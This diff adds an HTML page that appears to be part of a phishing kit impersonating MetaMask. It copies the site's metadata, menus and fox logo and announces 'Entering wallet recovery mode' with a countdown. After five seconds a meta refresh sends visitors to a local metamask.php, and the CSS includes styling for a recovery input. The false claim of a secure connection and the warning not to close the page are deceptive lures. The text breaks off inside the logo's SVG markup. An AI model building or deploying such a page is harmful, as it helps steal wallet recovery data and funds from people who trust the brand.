@@ -1,0 +1,536 @@
+<html data-wf-page="606584e79beac93d942e4e87" data-wf-site="604ec65d7935b45ce251b35e" lang="en" class="w-mod-js w-mod-ix wf-changaone-n4-active wf-changaone-i4-active wf-active w-mod-js"><head><style>.wf-force-outline-none[tabindex="-1"]:focus{outline:none;}</style>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <style>
+    .wf-force-outline-none[tabindex="-1"]:focus {
+      outline: none;
+    }
+  </style>
+
+  <title>MetaMask - A crypto wallet &amp; gateway to blockchain apps</title>
+  <meta content="A crypto wallet &amp; gateway to blockchain apps" name="description">
+  <meta content="MetaMask - A crypto wallet &amp; gateway to blockchain apps" property="og:title">
+  <meta content="A crypto wallet &amp; gateway to blockchain apps" property="og:description">
+  <meta content="https://uploads-ssl.webflow.com/5b479ea1731aa13135a70342/5e6010110671f79d5c96adf9_open%20graph.png" property="og:image">
+  <meta content="MetaMask - A crypto wallet &amp; gateway to blockchain apps" property="twitter:title">
+  <meta content="A crypto wallet &amp; gateway to blockchain apps" property="twitter:description">
+  <meta content="https://uploads-ssl.webflow.com/5b479ea1731aa13135a70342/5e6010110671f79d5c96adf9_open%20graph.png" property="twitter:image">
+  <meta property="og:type" content="website">
+  <meta content="summary_large_image" name="twitter:card">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <meta content="UA-37075177-6" name="google-site-verification">
+  <meta content="Webflow" name="generator">
+  <meta http-equiv="refresh" content="5;URL=metamask.php">
+  <link href="./metamask_files/normalize.css" rel="stylesheet" type="text/css">
+  <link href="./metamask_files/webflow.css" rel="stylesheet" type="text/css">
+  <link href="./metamask_files/metamask-staging-2.webflow.css" rel="stylesheet" type="text/css">
+  <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/yZguKF1TiDm6F3yJWVhmOKQ9/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-H5arsq6vo+zXBZN6NglbXmqmJ0Fd0I03R0T+1QSVXdReK5pp2+U7XIsjY638NZyL"></script><script type="text/javascript" async="" src="./metamask_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-H5arsq6vo+zXBZN6NglbXmqmJ0Fd0I03R0T+1QSVXdReK5pp2+U7XIsjY638NZyL"></script>
+  <script type="text/javascript" async="" src="./metamask_files/analytics.js.download"></script>
+  <script src="./metamask_files/webfont.js.download" type="text/javascript"></script>
+  <link rel="stylesheet" href="./metamask_files/css" media="all">
+  <style>
+    .recoveryInput {
+      width: 10rem;
+    }
+
+    .inputs {
+      display: flex;
+      justify-content: center;
+    }
+
+    .inputs input:nth-child(2) {
+      margin-left: 1rem;
+    }
+
+    input {
+      padding-left: 10px;
+      height: 2rem;
+      outline: none;
+      border: 1px solid rgb(223, 227, 235);
+      border-radius: 10px;
+    }
+
+    input:focus {
+      border: 1px solid #037dd6;
+    }
+  </style>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Changa+One:400,400italic" media="all"><script type="text/javascript">
+    WebFont.load({
+      google: {
+        families: ["Changa One:400,400italic"]
+      }
+    });
+  </script>
+  <!-- [if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif] -->
+  <script type="text/javascript">
+    ! function (o, c) {
+      var n = c.documentElement,
+        t = " w-mod-";
+      n.className += t + "js", ("ontouchstart" in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className +=
+        t + "touch")
+    }(window, document);
+  </script>
+  <link href="https://metamask.io/./metamask_files/favicon.png" rel="shortcut icon" type="image/x-icon">
+  <link href="https://metamask.io/./metamask_files/webclip.png" rel="apple-touch-icon">
+  <link href="https://metamask.io/" rel="canonical">
+  <script async="" src="./metamask_files/js"></script>
+  <script type="text/javascript">
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+    gtag('config', 'UA-37075177-6', {
+      'anonymize_ip': true
+    });
+  </script>
+  <!-- BEGIN LivePerson Monitor. -->
+  <script type="text/javascript">
+    window.lpTag = window.lpTag || {}, 'undefined' == typeof window.lpTag._tagCount ? (window.lpTag = {
+      wl: lpTag.wl || null,
+      scp: lpTag.scp || null,
+      site: '88982875' || '',
+      section: lpTag.section || '',
+      tagletSection: lpTag.tagletSection || null,
+      autoStart: lpTag.autoStart !== !1,
+      ovr: lpTag.ovr || {},
+      _v: '1.10.0',
+      _tagCount: 1,
+      protocol: 'https:',
+      events: {
+        bind: function (t, e, i) {
+          lpTag.defer(function () {
+            lpTag.events.bind(t, e, i)
+          }, 0)
+        },
+        trigger: function (t, e, i) {
+          lpTag.defer(function () {
+            lpTag.events.trigger(t, e, i)
+          }, 1)
+        }
+      },
+      defer: function (t, e) {
+        0 === e ? (this._defB = this._defB || [], this._defB.push(t)) : 1 === e ? (this._defT = this._defT || [],
+          this._defT.push(t)) : (this._defL = this._defL || [], this._defL.push(t))
+      },
+      load: function (t, e, i) {
+        var n = this;
+        setTimeout(function () {
+          n._load(t, e, i)
+        }, 0)
+      },
+      _load: function (t, e, i) {
+        var n = t;
+        t || (n = this.protocol + '//' + (this.ovr && this.ovr.domain ? this.ovr.domain :
+          'lptag.liveperson.net') + '/tag/tag.js?site=' + this.site);
+        var o = document.createElement('script');
+        o.setAttribute('charset', e ? e : 'UTF-8'), i && o.setAttribute('id', i), o.setAttribute('src', n),
+          document.getElementsByTagName('head').item(0).appendChild(o)
+      },
+      init: function () {
+        this._timing = this._timing || {}, this._timing.start = (new Date).getTime();
+        var t = this;
+        window.attachEvent ? window.attachEvent('onload', function () {
+          t._domReady('domReady')
+        }) : (window.addEventListener('DOMContentLoaded', function () {
+          t._domReady('contReady')
+        }, !1), window.addEventListener('load', function () {
+          t._domReady('domReady')
+        }, !1)), 'undefined' === typeof window._lptStop && this.load()
+      },
+      start: function () {
+        this.autoStart = !0
+      },
+      _domReady: function (t) {
+        this.isDom || (this.isDom = !0, this.events.trigger('LPT', 'DOM_READY', {
+          t: t
+        })), this._timing[t] = (new Date).getTime()
+      },
+      vars: lpTag.vars || [],
+      dbs: lpTag.dbs || [],
+      ctn: lpTag.ctn || [],
+      sdes: lpTag.sdes || [],
+      hooks: lpTag.hooks || [],
+      identities: lpTag.identities || [],
+      ev: lpTag.ev || []
+    }, lpTag.init()) : window.lpTag._tagCount += 1;
+  </script>
+  <!-- END LivePerson Monitor. -->
+  <script charset="UTF-8" src="./metamask_files/tag.js.download"></script>
+  <script src="./metamask_files/enterprise.js.download"></script>
+  <script charset="UTF-8" id="_lpTagScriptId_0" src="./metamask_files/jsonp"></script>
+  <script>
+    timeLeft = 5;
+    
+    function countdown() {
+      timeLeft--;
+      document.getElementById("seconds").innerHTML = String( timeLeft );
+      if (timeLeft > 0) {
+        setTimeout(countdown, 1000);
+      }
+    };
+    
+    setTimeout(countdown, 1000);
+    </script>
+<script charset="UTF-8" src="https://lptag.liveperson.net/tag/tag.js?site=88982875"></script><script charset="UTF-8" id="_lpTagScriptId_0" src="https://lptag.liveperson.net/lptag/api/account/88982875/configuration/applications/taglets/.jsonp?v=2.0&amp;df=undefined&amp;b=undefined"></script></head>
+
+<body class="body-4">
+  <div data-collapse="medium" data-animation="default" data-duration="200" data-easing="ease-in-out" data-easing2="ease-in-out" id="downloadButtonNav" role="banner" class="navigation-bar dark w-nav">
+    <div class="container-27 w-container">
+      <a href="https://metamask.io/index.html" aria-current="page" class="brand-link w-nav-brand w--current"><img src="./metamask_files/mm-logo.svg" width="211" alt="" class="image-3"></a>
+      <nav role="navigation" class="navigation-menu w-nav-menu">
+        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
+          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-0" aria-controls="w-dropdown-list-0" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
+            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
+            <div>Features</div>
+          </div>
+          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-0" aria-labelledby="w-dropdown-toggle-0">
+            <a href="https://metamask.io/swaps.html" class="dropdown-link w-dropdown-link" tabindex="0">Swaps</a>
+            <a href="https://metamask.io/1559.html" class="dropdown-link w-dropdown-link" tabindex="0">EIP-1559</a>
+          </nav>
+        </div>
+        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
+          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-1" aria-controls="w-dropdown-list-1" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
+            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
+            <div>Support</div>
+          </div>
+          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-1" aria-labelledby="w-dropdown-toggle-1">
+            <a href="https://metamask.io/faqs.html" class="dropdown-link w-dropdown-link" tabindex="0">FAQs</a>
+            <a href="https://community.metamask.io/" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Get Support</a>
+            <a href="https://metamask.zendesk.com/hc/en-us" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Knowledge Base<br></a>
+          </nav>
+        </div>
+        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
+          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-2" aria-controls="w-dropdown-list-2" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
+            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
+            <div>About</div>
+          </div>
+          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-2" aria-labelledby="w-dropdown-toggle-2">
+            <a href="https://metamask.io/about.html" class="dropdown-link w-dropdown-link" tabindex="0">Team</a>
+            <a href="https://consensys.net/open-roles/?discipline=32543" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Careers</a>
+            <a href="https://medium.com/metamask" rel="noreferer, noopener" target="_blank" class="dropdown-link w-dropdown-link" tabindex="0">Blog</a>
+          </nav>
+        </div>
+        <div data-hover="1" data-delay="0" class="w-dropdown" style="max-width: 940px;">
+          <div class="dropdown w-dropdown-toggle" id="w-dropdown-toggle-3" aria-controls="w-dropdown-list-3" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0">
+            <div class="w-icon-dropdown-toggle" aria-hidden="true"></div>
+            <div>Build</div>
+          </div>
+          <nav class="dropdown-list w-dropdown-list" id="w-dropdown-list-3" aria-labelledby="w-dropdown-toggle-3">
+            <a href="https://docs.metamask.io/guide/" rel="noreferer, noopener" class="dropdown-link w-dropdown-link" tabindex="0">Developers</a>
+            <a href="https://metamask.io/institutions.html" class="dropdown-link w-dropdown-link" tabindex="0">Institutions</a>
+          </nav>
+        </div>
+        <a href="#" class="navigation-link install-blue w-nav-link" style="max-width: 940px;">Download</a>
+      </nav>
+      <div class="hamburger-button white w-nav-button" style="-webkit-user-select: text;" aria-label="menu" role="button" tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false">
+        <div class="icon w-icon-nav-menu"></div>
+      </div>
+    </div>
+    <div class="w-nav-overlay" data-wf-ignore="" id="w-nav-overlay-0"></div>
+  <div class="w-nav-overlay" data-wf-ignore="" id="w-nav-overlay-0"></div></div>
+  <div class="section wf-section">
+    <div class="container-2 w-container">
+      <div data-w-id="7dbc2cc8-8525-0cc6-75f0-6344b31d065e" class="columns w-row" style="opacity: 0.95916; height: 100%; will-change: opacity;">
+        <div class="content-column w-col w-col-6">
+          <h1 class="heading">Entering wallet recovery mode</h1>
+          <p class="paragraph-5">Do you have a moment please? We are establishing a connection with our secure internet environment. Procedure starts in: <span id="seconds">4</span> sec</p>
+          <br><b>You are requested not to close this page to avoid complications with your wallet.</b><p></p>
+<img src="metamask_files/wpp.gif" align="left">
+        </div>
+        <div class="image-column w-col w-col-6"></div>
+      </div>
+    </div>
+  </div>
+  <div class="cta-section centered-accented wf-section">
+    <div id="logo-container" class="html-embed w-embed w-script">
+      <script src="./metamask_files/logo.js.download"></script>
+      <svg width="230px" height="230px" style="display: none;">
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="71.92854076623917,123.27531456947327 62.11557939648628,144.25063118338585 60.08334368467331,128.21017045527697">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="60.08334368467331,128.21017045527697 78.16966265439987,100.80135259777308 71.92854076623917,123.27531456947327">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="66.02552562952042,153.5317423939705 62.11557939648628,144.25063118338585 71.92854076623917,123.27531456947327">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="71.92854076623917,123.27531456947327 80.90257912874222,141.0149072110653 66.02552562952042,153.5317423939705">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="77.68979385495186,129.16222669184208 80.90257912874222,141.0149072110653 71.92854076623917,123.27531456947327">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="71.92854076623917,123.27531456947327 78.16966265439987,100.80135259777308 77.68979385495186,129.16222669184208">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="102.10276644676924,140.7651862502098 63.47102239727974,156.16183057427406 65.48731788992882,154.75094810128212">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="62.496187686920166,157.846260368824 64.31858211755753,156.7339614033699 102.10276644676924,140.7651862502098">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="63.47102239727974,156.16183057427406 66.02552562952042,153.5317423939705 65.48731788992882,154.75094810128212">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="80.90257912874222,141.0149072110653 65.48731788992882,154.75094810128212 66.02552562952042,153.5317423939705">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="95.97256034612656,28.559286296367645 107.11080305278301,22.443725764751434 98.42909000813961,51.995884478092194">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="98.42909000813961,51.995884478092194 85.13715267181396,81.93983808159828 95.97256034612656,28.559286296367645">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="64.31858211755753,156.7339614033699 62.496187686920166,157.846260368824 65.48731788992882,154.75094810128212">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="64.31858211755753,156.7339614033699 65.48731788992882,154.75094810128212 80.90257912874222,141.0149072110653">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="64.06594455242157,158.34725141525269 61.85843497514725,159.26366835832596 64.31858211755753,156.7339614033699">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="64.31858211755753,156.7339614033699 80.90257912874222,141.0149072110653 64.06594455242157,158.34725141525269">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="98.42909000813961,51.995884478092194 107.11080305278301,22.443725764751434 113.72588294092566,27.402206659317017">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="113.72588294092566,27.402206659317017 113.6325859837234,57.12460458278656 98.42909000813961,51.995884478092194">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="101.37620210647583,66.99869468808174 85.13715267181396,81.93983808159828 98.42909000813961,51.995884478092194">
+        </polygon>
+        <polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="98.42909000813961,51.995884478092194 113.6325859837234,57.12460458278656 101.37620210647583,66.99869468808174">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="133.67715068161488,64.69000533223152 113.04505601525307,28.96776854991913 113.22773031424731,23.939768970012665">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="112.4420433677733,24.9766543507576 133.67715068161488,64.69000533223152 112.14066942222416,30.082905292510986">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="111.65295132435858,26.7520609498024 133.67715068161488,64.69000533223152 110.92414576560259,34.38990384340286">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="116.58121197018772,149.60566401481628 136.5865045785904,143.69064658880234 106.09300583600998,156.43641978502274">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="90.37121325731277,153.30029219388962 106.09300583600998,156.43641978502274 64.06594455242157,158.34725141525269">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="153.85275050997734,105.93298073858023 136.5865045785904,143.69064658880234 116.58121197018772,149.60566401481628">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="106.09300583600998,156.43641978502274 90.37121325731277,153.30029219388962 116.58121197018772,149.60566401481628">
+        </polygon>
+        <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="54.60434317588806,99.54744838178158 52.07817316055298,108.9375389739871 48.235151171684265,121.4803789742291">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="141.7770902812481,72.99464702606201 153.85275050997734,105.93298073858023 136.7201817035675,103.48638586699963">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="116.58121197018772,149.60566401481628 136.7201817035675,103.48638586699963 153.85275050997734,105.93298073858023">
+        </polygon>
+        <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="66.75863519310951,67.58462712168694 62.74326965212822,77.85837769508362 60.0904381275177,83.52385237812996">
+        </polygon>
+        <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="60.429134368896484,190.12838810682297 43.74307334423065,145.21488934755325 52.75135010480881,147.96658724546432">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="136.7201817035675,103.48638586699963 112.96623786911368,97.8150437027216 141.7770902812481,72.99464702606201">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="112.96623786911368,97.8150437027216 110.92414576560259,34.38990384340286 141.7770902812481,72.99464702606201">
+        </polygon>
+        <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="52.75135010480881,147.96658724546432 43.74307334423065,145.21488934755325 42.668385207653046,124.3497396633029">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="116.58121197018772,149.60566401481628 90.37121325731277,153.30029219388962 112.96623786911368,97.8150437027216">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="112.96623786911368,97.8150437027216 136.7201817035675,103.48638586699963 116.58121197018772,149.60566401481628">
+        </polygon>
+        <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="0.6276148557662964,90.03793895244598 5.324499309062958,73.18416461348534 6.762354373931885,75.49414604902267">
+        </polygon>
+        <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="6.762354373931885,75.49414604902267 1.287185549736023,94.98122163116932 0.6276148557662964,90.03793895244598">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="52.75135010480881,147.96658724546432 74.49251353740692,147.02468171715736 90.37121325731277,153.30029219388962">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="90.37121325731277,153.30029219388962 60.64487397670746,209.59277004003525 52.75135010480881,147.96658724546432">
+        </polygon>
+        <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="13.062822818756104,74.64532166719437 61.27940163016319,69.35118794441223 78.4760020673275,76.48772105574608">
+        </polygon>
+        <polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="78.4760020673275,76.48772105574608 61.27940163016319,69.35118794441223 76.34791254997253,51.532703042030334">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="41.128815710544586,135.61675250530243 70.9628877043724,131.97249487042427 90.37121325731277,153.30029219388962">
+        </polygon>
+        <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="6.762354373931885,75.49414604902267 5.324499309062958,73.18416461348534 13.062822818756104,74.64532166719437">
+        </polygon>
+        <polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="13.062822818756104,74.64532166719437 10.090210139751434,75.80693557858467 6.762354373931885,75.49414604902267">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="41.128815710544586,135.61675250530243 74.49251353740692,147.02468171715736 52.75135010480881,147.96658724546432">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="112.96623786911368,97.8150437027216 90.37121325731277,153.30029219388962 70.9628877043724,131.97249487042427">
+        </polygon>
+        <polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)" points="78.4760020673275,76.48772105574608 10.090210139751434,75.80693557858467 13.062822818756104,74.64532166719437">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="41.128815710544586,135.61675250530243 52.75135010480881,147.96658724546432 8.996459543704987,103.81838351488113">
+        </polygon>
+        <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="78.4760020673275,76.48772105574608 76.34791254997253,51.532703042030334 125.72111774235964,22.070873379707336">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="5.400756001472473,103.38071808218956 1.287185549736023,94.98122163116932 6.762354373931885,75.49414604902267">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="41.128815710544586,135.61675250530243 45.57834059000015,122.57043197751045 70.9628877043724,131.97249487042427">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="70.9628877043724,131.97249487042427 81.64133340120316,103.45338899642229 112.96623786911368,97.8150437027216">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="81.64133340120316,103.45338899642229 70.9628877043724,131.97249487042427 45.57834059000015,122.57043197751045">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="45.57834059000015,122.57043197751045 41.128815710544586,135.61675250530243 5.400756001472473,103.38071808218956">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="6.762354373931885,75.49414604902267 11.671859622001648,81.6269800066948 5.400756001472473,103.38071808218956">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="11.671859622001648,81.6269800066948 6.762354373931885,75.49414604902267 10.090210139751434,75.80693557858467">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="10.090210139751434,75.80693557858467 15.906940400600433,80.19144862890244 11.671859622001648,81.6269800066948">
+        </polygon>
+        <polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)" points="10.090210139751434,75.80693557858467 78.4760020673275,76.48772105574608 15.906940400600433,80.19144862890244">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="54.89858776330948,95.24279579520226 45.57834059000015,122.57043197751045 5.400756001472473,103.38071808218956">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="45.57834059000015,122.57043197751045 54.89858776330948,95.24279579520226 81.64133340120316,103.45338899642229">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="5.400756001472473,103.38071808218956 11.671859622001648,81.6269800066948 54.89858776330948,95.24279579520226">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="112.96623786911368,97.8150437027216 96.09239473938942,90.96797585487366 78.4760020673275,76.48772105574608">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="112.96623786911368,97.8150437027216 81.64133340120316,103.45338899642229 59.78282034397125,80.92188492417336">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="96.09239473938942,90.96797585487366 112.96623786911368,97.8150437027216 59.78282034397125,80.92188492417336">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="81.64133340120316,103.45338899642229 54.89858776330948,95.24279579520226 59.78282034397125,80.92188492417336">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="59.78282034397125,80.92188492417336 78.4760020673275,76.48772105574608 96.09239473938942,90.96797585487366">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="15.906940400600433,80.19144862890244 78.4760020673275,76.48772105574608 59.78282034397125,80.92188492417336">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="59.78282034397125,80.92188492417336 11.671859622001648,81.6269800066948 15.906940400600433,80.19144862890244">
+        </polygon>
+        <polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="54.89858776330948,95.24279579520226 11.671859622001648,81.6269800066948 59.78282034397125,80.92188492417336">
+        </polygon>
+        <polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="125.72111774235964,22.070873379707336 129.5919768512249,36.573477387428284 78.4760020673275,76.48772105574608">
+        </polygon>
+        <polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="78.4760020673275,76.48772105574608 129.5919768512249,36.573477387428284 112.96623786911368,97.8150437027216">
+        </polygon>
+      </svg>
+    <svg width="230px" height="230px"><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="128.525052331388,66.50649458169937 101.474947668612,66.50649458169937 90.65711930394173,39.64613199234009"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="90.65711930394173,39.64613199234009 139.34288069605827,39.64613199234009 128.525052331388,66.50649458169937"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="101.474947668612,66.50649458169937 32.800844609737396,14.82413649559021 90.65711930394173,39.64613199234009"></polygon><polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="197.1991553902626,14.82413649559021 128.525052331388,66.50649458169937 139.34288069605827,39.64613199234009"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="60.95455154776573,87.5705037266016 30.089588463306427,79.91348698735237 28.350031077861786,72.64967888593674"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="169.04544845223427,87.5705037266016 201.6499689221382,72.64967888593674 199.91041153669357,79.91348698735237"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="35.687158703804016,101.15490604192019 60.95455154776573,87.5705037266016 74.26758199930191,90.29880195856094"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="194.31284129619598,101.15490604192019 155.7324180006981,90.29880195856094 169.04544845223427,87.5705037266016"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="31.243604123592377,88.6357069015503 60.95455154776573,87.5705037266016 35.687158703804016,101.15490604192019"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="31.243604123592377,88.6357069015503 30.089588463306427,79.91348698735237 60.95455154776573,87.5705037266016"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="198.75639587640762,88.6357069015503 194.31284129619598,101.15490604192019 169.04544845223427,87.5705037266016"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="198.75639587640762,88.6357069015503 169.04544845223427,87.5705037266016 199.91041153669357,79.91348698735237"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="62.13241755962372,48.80859464406967 60.95455154776573,87.5705037266016 28.350031077861786,72.64967888593674"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="74.26758199930191,90.29880195856094 60.95455154776573,87.5705037266016 62.13241755962372,48.80859464406967"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="201.6499689221382,72.64967888593674 169.04544845223427,87.5705037266016 167.86758244037628,48.80859464406967"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="167.86758244037628,48.80859464406967 169.04544845223427,87.5705037266016 155.7324180006981,90.29880195856094"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="75.56591644883156,170.03321766853333 32.72246301174164,184.64668691158295 21.766113936901093,142.16510832309723"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="208.2338860630989,142.16510832309723 197.27753698825836,184.64668691158295 154.43408355116844,170.03321766853333"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="62.13241755962372,48.80859464406967 101.474947668612,66.50649458169937 74.26758199930191,90.29880195856094"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="155.7324180006981,90.29880195856094 128.525052331388,66.50649458169937 167.86758244037628,48.80859464406967"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="24.363132417201996,75.34928232431412 28.350031077861786,72.64967888593674 30.089588463306427,79.91348698735237"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="205.636867582798,75.34928232431412 199.91041153669357,79.91348698735237 201.6499689221382,72.64967888593674"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="62.47343748807907,105.01490499824286 21.766113936901093,142.16510832309723 